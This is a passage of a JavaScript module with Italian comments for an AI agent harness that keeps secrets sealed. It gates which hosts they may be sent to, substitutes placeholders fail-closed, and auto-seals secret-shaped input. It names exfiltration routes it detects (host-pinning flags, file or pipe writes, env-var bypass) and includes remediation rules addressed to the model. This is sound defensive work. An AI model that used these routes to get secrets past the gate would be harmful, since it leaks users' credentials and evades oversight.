 *   - http → consentito SOLO verso loopback LETTERALE e SOLO con allowLocalHttp on (parità col fast-path bash); l'IPv6
 *     `[::1]` è gestito (più capace del path bash). Mai http verso host esterno.
 * @returns {{allowed:boolean, reason?:string, warn?:string}}
 */
export function checkSinkTyped(name, urlString, mode = "strict") {
  const s = SEALED.get(name);
  if (!s) return { allowed: false, reason: "secret does not exist" };
  if (mode === "off") return { allowed: true };
  let u;
  try { u = new URL(String(urlString)); } catch { return { allowed: false, reason: `invalid URL '${urlString}'` }; }
  const scheme = u.protocol.replace(/:$/, "").toLowerCase();
  const host = u.hostname.replace(/^\[|\]$/g, "").toLowerCase(); // togli [] IPv6 prima del check loopback
  if (scheme !== "http" && scheme !== "https") {
    return { allowed: false, reason: `'${name}': only http/https URLs are allowed (got '${scheme}')` };
  }
  if (scheme === "http") {
    if (!isLoopbackLiteral(host)) return { allowed: false, reason: `'${name}' cannot be sent over http:// to a non-loopback host (${host}); use https` };
    if (!s.allowLocalHttp) return { allowed: false, reason: `'${name}': http→loopback requires allowLocalHttp (enable via request_local_http)` };
    return { allowed: true }; // loopback letterale + flag on → ok (bypassa allowedSinks per il solo loopback, come il fast-path bash)
  }
  // https
  if (s.allowedSinks.length) {
    if (s.allowedSinks.some((a) => hostMatches(host, a))) return { allowed: true };
    return { allowed: false, reason: `'${name}' allowed only toward [${s.allowedSinks.join(", ")}]; disallowed host: ${host}` };
  }
  const reason = `'${name}' without allowedSinks: network send blocked (request_sink for ${host} to use it there)`;
  // review P2: warn NON dice "blocked" (il valore VIENE inviato) — messaggio onesto.
  if (mode === "warn") return { allowed: true, warn: `'${name}' has no allowedSinks — WARN mode: value WILL be sent to ${host} (declare allowedSinks to gate it)` };
  return { allowed: false, reason };
}

/**
 * injectTypedRequest — risolve i `{{secret:NAME}}` in url+headers+body di una richiesta TIPIZZATA applicando il
 * sink-gating sul SOLO host dell'URL (checkSinkTyped). FAIL-CLOSED: se anche un ref è bloccato/inesistente NON
 * sostituisce nulla e ritorna `blocked` (il chiamante NON deve inviare la richiesta). Il valore resta privato (valueOf).
 * @param {{url:string, headers?:Record<string,string>, body?:string}} req @param {SinkMode} [mode]
 * @returns {{ url?:string, headers?:Record<string,string>, body?:string, injected:string[], blocked:{name,reason}[], warnings:string[] }}
 */
export function injectTypedRequest({ url, headers = {}, body = "" } = {}, mode = "strict") {
  const hdrs = headers && typeof headers === "object" ? headers : {};
  const combined = [String(url ?? ""), ...Object.values(hdrs).map((v) => String(v ?? "")), String(body ?? "")].join("\n");
  const refs = referencedSecrets(combined);
  const blocked = [], warnings = [];
  const valueMap = {};
  for (const name of refs) {
    if (!SEALED.has(name)) { blocked.push({ name, reason: "secret does not exist" }); continue; }
    const gate = checkSinkTyped(name, url, mode);
    if (!gate.allowed) { blocked.push({ name, reason: gate.reason }); continue; }
    if (gate.warn) warnings.push(`${name}: ${gate.warn}`);
    valueMap[name] = SEALED.get(name).value;
  }
  if (blocked.length) return { injected: [], blocked, warnings }; // fail-closed: niente sostituzione
  const sub = (s) => { let t = String(s ?? ""); for (const [n, v] of Object.entries(valueMap)) t = t.split(`{{secret:${n}}}`).join(v); return t; };
  const outHeaders = {};
  for (const [k, v] of Object.entries(hdrs)) outHeaders[k] = sub(v);
  return { url: sub(url), headers: outHeaders, body: body == null ? body : sub(body), injected: Object.keys(valueMap), blocked, warnings };
}

/**
 * previewSecretUse — PRE-FLIGHT (idea agent-POV utente msg 724): simula il sink-gating di UN secret verso
 * `opText` SENZA eseguire, e se è bloccato dà la REMEDIATION esatta (quale request_sink / request_local_http /
 * fix-nome). Converte il loop prova-fallisci-(aggira) in pianifica-poi-agisci → toglie sia la frizione sia la
 * tentazione di bypassare con una env-var (FIND-1/FIND-3). Read-only. @returns
 *   {{name, exists:boolean, allowed:boolean, reason?:string, remediation?:string, warn?:string}}
 */
export function previewSecretUse(name, opText, mode = "strict") {
  if (!SEALED.has(name)) {
    const suggestion = closestName(name, [...SEALED.keys()]);
    return { name, exists: false, allowed: false, reason: "secret does not exist", remediation: suggestion ? `did you mean '${suggestion}'? (verify with check_secret_refs)` : "use list_secrets to see available names" };
  }
  const gate = checkSink(name, opText, mode);
  if (gate.allowed) return gate.warn ? { name, exists: true, allowed: true, warn: gate.warn } : { name, exists: true, allowed: true };
  const s = SEALED.get(name);
  const hosts = extractHosts(opText);
  const external = hosts.filter((h) => !isLoopbackLiteral(h) && !s.allowedSinks.some((a) => hostMatches(h, a)));
  const loopback = hosts.filter(isLoopbackLiteral);
  // Rami ESPLICITI allineati ai motivi di blocco di checkSink (review P2-1/P2-2 + arch F6): senza questi, host-pinning/
  // file-exfil/no-host/composizione cadevano nel fallback generico "chiedi un sink" — consiglio SBAGLIATO che
  // rimanderebbe il modello nel loop prova-fallisci (il contrario dello scopo del preflight).
  let remediation;
  if (hasHostPinning(opText)) {
    remediation = `host-pinning (--resolve/--connect-to/proxy/Host:) makes the real destination unverifiable → REMOVE that flag. Granting a sink will NOT help.`;
  } else if (hasFileOrPipeExfil(opText)) {
    remediation = `a sealed secret cannot be written to a file/pipe → send it to an allowed host over https instead.`;
  } else if (hasInsecureHttp(opText) && loopback.length && !s.allowLocalHttp) {
    remediation = `target is http://localhost → call request_local_http('${name}', why), then use it in a SINGLE clean command (no ';'/'|'/'&&'/redirects).`;
  } else if (external.length) {
    remediation = `host(s) [${external.join(", ")}] not in allowedSinks → call request_sink('${name}', '${external[0]}', why) so the user can approve it. Do NOT read the value from an env var.`;
  } else if (hasInsecureHttp(opText)) {
    remediation = `a sealed secret cannot be sent over http:// to a non-loopback host → use https.`;
  } else if (s.allowedSinks.length && !hosts.length) {
    remediation = `no destination host is identifiable in the command → put an explicit https URL of an allowed host (${s.allowedSinks.join(", ")}) in the command (not a sink grant).`;
  } else if (hasCommandComposition(opText)) {
    remediation = `command composition (';'/'|'/'&&'/'$()'/redirects/control-chars) blocks a loopback secret use → use a SINGLE clean command.`;
  } else {
    remediation = `adjust the operation; grant the needed destination via request_sink (external host) or request_local_http (localhost); do NOT invent a CLI command.`;
  }
  return { name, exists: true, allowed: false, reason: gate.reason, remediation };
}

/**
 * injectSecrets — sostituisce `{{secret:NAME}}` con il valore reale in `opText`, applicando il sink-gating.
 * Se un riferimento è bloccato (sink non consentito / secret inesistente) → NON sostituisce e lo riporta in
 * `blocked` (il chiamante deve RIFIUTARE l'operazione, non eseguirla parzialmente). @returns
 *   {{ text:string, injected:string[], blocked:{name:string,reason:string}[], warnings:string[] }}
 */
export function injectSecrets(opText, mode = "strict") {
  const refs = referencedSecrets(opText);
  const injected = [], blocked = [], warnings = [];
  let text = String(opText ?? "");
  for (const name of refs) {
    if (!SEALED.has(name)) { blocked.push({ name, reason: "secret does not exist" }); continue; }
    const gate = checkSink(name, opText, mode);
    if (!gate.allowed) { blocked.push({ name, reason: gate.reason }); continue; }
    if (gate.warn) warnings.push(`${name}: ${gate.warn}`);
    text = text.split(`{{secret:${name}}}`).join(valueOf(name));
    injected.push(name);
  }
  return { text, injected, blocked, warnings };
}

/**
 * scanIngress — regex-ingress: trova in `text` valori che SEMBRANO segreti (pattern statici noti), per sigillarli
 * PRIMA che entrino nel context. Ritorna i match unici + il livello di confidenza. NON modifica il testo (la
 * sostituzione/seal la decide il chiamante: auto sui high-confidence, ask sugli altri).
 * @returns {{ value:string, confidence:'high'|'medium' }[]}
 */
export function scanIngress(text) {
  const found = new Map(); // value → confidence
  const t = String(text ?? "");
  for (const re of SECRET_PATTERNS) {
    re.lastIndex = 0;
    let m;
    while ((m = re.exec(t))) {
      const v = m[0];
      if (v && v.length >= 8) found.set(v, "high"); // i SECRET_PATTERNS sono shape ad alta confidenza
    }
  }
  return [...found.entries()].map(([value, confidence]) => ({ value, confidence }));
}

/**
 * loadFromEnv — provisioning OUT-OF-BAND: legge i secret da env `SEALED_SECRET_<NAME>=value` (il valore non passa
 * mai dal modello). La metadata (description, allowedSinks) arriva da `meta` (es. da .pi/secrets.config.json, che
 * NON contiene valori). @returns {string[]} nomi caricati.
 */
export function loadFromEnv(env = process.env, meta = {}) {
  const loaded = [];
  for (const [k, v] of Object.entries(env)) {
    if (!k.startsWith("SEALED_SECRET_") || v == null || v === "") continue;
    const name = k.slice("SEALED_SECRET_".length);
    if (!NAME_RE.test(name)) continue;
    const m = meta[name] || {};
    const r = setSecret(name, String(v), { description: m.description ?? "", allowedSinks: m.allowedSinks ?? [], redactEgress: m.redactEgress, allowLocalHttp: m.allowLocalHttp });
    if (r.ok) loaded.push(name);
  }
  return loaded;
}

/**
 * injectIntoStrings — variante multi-arg per il hook tool_call: gate di TUTTI i riferimenti contro il testo
 * COMBINATo (un url in un arg + il ref in un altro vengono visti insieme), poi sostituzione per-stringa. FAIL-CLOSED:
 * se anche UN solo riferimento è bloccato, NON sostituisce NULLA (niente exec parziale). Il valore resta nel modulo.
 * @param {string[]} strings @param {SinkMode} [mode] @returns {{strings:string[], injected:string[], blocked:{name,reason}[], warnings:string[]}}
 */
export function injectIntoStrings(strings, mode = "strict") {
  const arr = Array.isArray(strings) ? strings.map((s) => String(s ?? "")) : [];
  const combined = arr.join("\n");
  const refs = referencedSecrets(combined);
  const blocked = [], warnings = [];
  if (!refs.length) return { strings: arr, injected: [], blocked, warnings };
  const valueMap = {};
  for (const name of refs) {
    if (!SEALED.has(name)) { blocked.push({ name, reason: "secret does not exist" }); continue; }
    const gate = checkSink(name, combined, mode);
    if (!gate.allowed) { blocked.push({ name, reason: gate.reason }); continue; }
    if (gate.warn) warnings.push(`${name}: ${gate.warn}`);
    valueMap[name] = SEALED.get(name).value;
  }
  if (blocked.length) return { strings: arr, injected: [], blocked, warnings }; // fail-closed: non sostituire nulla
  const out = arr.map((s) => {
    let t = s;
    for (const [name, val] of Object.entries(valueMap)) t = t.split(`{{secret:${name}}}`).join(val);
    return t;
  });
  return { strings: out, injected: Object.keys(valueMap), blocked, warnings };
}

/** INTERNO — nome del sealed-secret il cui valore == `value` (per riusare il riferimento, no doppio-seal). */
function nameForValue(value) {
  for (const [name, s] of SEALED.entries()) if (s.value === value) return name;
  return null;
}

let ingressCounter = 0;

/**
 * autoSealIngress — REGEX-INGRESS (idea utente msg 578/579 "intercettate tramite regex... harness ti fa domanda"):
 * scansiona `text` per valori secret-shaped (scanIngress) e li SIGILLA al volo, sostituendo nel testo ogni valore con
 * il suo riferimento `{{secret:NAME}}`. Risultato: il VALORE non raggiunge mai il modello/provider (è il testo
 * trasformato che va avanti) + è redatto dai transcript (egress). Un valore già sigillato riusa il suo nome.
 * I match auto-rilevati NON dichiarano allowedSinks → in strict restano lockdown (un paste accidentale non è
 * esfiltrabile finché l'utente non lo abilita esplicitamente). @returns {{ text:string, sealed:{name,confidence}[] }}
 */
export function autoSealIngress(text, { redactEgress = true } = {}) {
  const hits = scanIngress(text);
  let out = String(text ?? "");
  const sealed = [];
  for (const h of hits) {
    let name = nameForValue(h.value);
    if (!name) {
      name = `INGRESS_${++ingressCounter}`;
      const r = setSecret(name, h.value, { description: `auto-ingress regex (${h.confidence})`, allowedSinks: [], redactEgress });
      if (!r.ok) continue;
    }
    out = out.split(h.value).join(`{{secret:${name}}}`);
    sealed.push({ name, confidence: h.confidence });
  }
  return { text: out, sealed };
}

/** Svuota il registry (test / fine-sessione). */
export function clearSealed() {
  SEALED.clear();
  ingressCounter = 0;
}

export default { setSecret, setAllowLocalHttp, listSecretsMeta, hasSecret, referencedSecrets, extractHosts, hasFileOrPipeExfil, hasInsecureHttp, hasCommandComposition, hasForeignHostToken, hasHostPinning, isLoopbackLiteral, checkSink, injectSecrets, injectIntoStrings, scanIngress, loadFromEnv, clearSealed,
  // lifecycle in-sessione (msg 708/713/715/718) + pre-flight (msg 724)
  isValidSinkHost, addAllowedSink, removeAllowedSink, setSecretDescription, renameSecret, removeSecret, computeSecretEditDiff, applySecretEdit, validateSecretRefs, previewSecretUse,
  // canale TIPIZZATO http_request (ADR 2026-06-30, arch H2): sink-gating su new URL(), niente shell-parsing
  checkSinkTyped, injectTypedRequest };
